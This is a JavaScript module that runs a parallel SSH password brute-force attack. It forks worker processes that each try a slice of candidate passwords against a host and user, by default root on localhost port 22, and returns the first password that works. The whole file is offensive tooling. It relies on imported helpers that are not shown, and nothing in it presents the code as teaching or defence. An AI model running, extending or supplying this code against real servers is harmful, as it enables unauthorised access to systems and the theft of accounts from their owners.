const sshBruteForce = require('./utils/sshBruteForce')
const verticalScaling = require('./utils/verticalScaling')

function verticallyScaledSSHBruteForceAttack({
  host = '127.0.0.1',
  username = 'root',
  port = 22,
  verbose = false,
  onFailure = () => undefined,
  errorRetryDelay = 1000,
  forks,
}) {
  return new Promise((resolve, reject) =>
    verticalScaling({
      verbose,
      forks,
      onFork: async ({ filter, index }) => {
        try {
          const password = await sshBruteForce({
            host,
            port,
            username,
            verbose,
            errorRetryDelay,
            onFailure: (currentPassword, passwordIndex) =>
              onFailure(currentPassword, passwordIndex, index),
            filter: (currentPassword, passwordIndex) => filter(passwordIndex),
          })

          if (password !== null) {
            resolve(password)
          } else {
            throw new Error('Password not found!')
          }
        } catch (error) {
          reject(error)
        }
      },
      onMaster: () =>
        verbose
          ? console.log(`Trying SSH connections to ${username}@${host} on port ${port}`)
          : undefined,
    }),
  )
}

module.exports = verticallyScaledSSHBruteForceAttack
